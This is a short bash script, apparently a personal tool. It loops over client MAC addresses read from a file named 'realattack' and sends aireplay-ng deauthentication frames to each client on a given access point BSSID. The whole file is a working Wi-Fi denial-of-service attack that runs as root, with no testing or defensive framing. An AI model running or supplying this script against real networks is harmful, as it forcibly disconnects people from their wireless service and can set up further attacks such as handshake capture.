#!/bin/bash
#Creator: David Parra-Sandoval
#created: 10/31/2020
#Last modified: 10/31/2020
clear

if [[ ${UID} -ne 0 ]]; then
exit 1
fi

MYBSSID="00:00:00:00:00:00"

for mac in $(cat realattack); do
if [[ $mac = "Station MAC" ]]; then
echo ""
else
sudo aireplay-ng -D --deauth 30 -a $MYBSSID -c $mac wlan0mon
fi
done
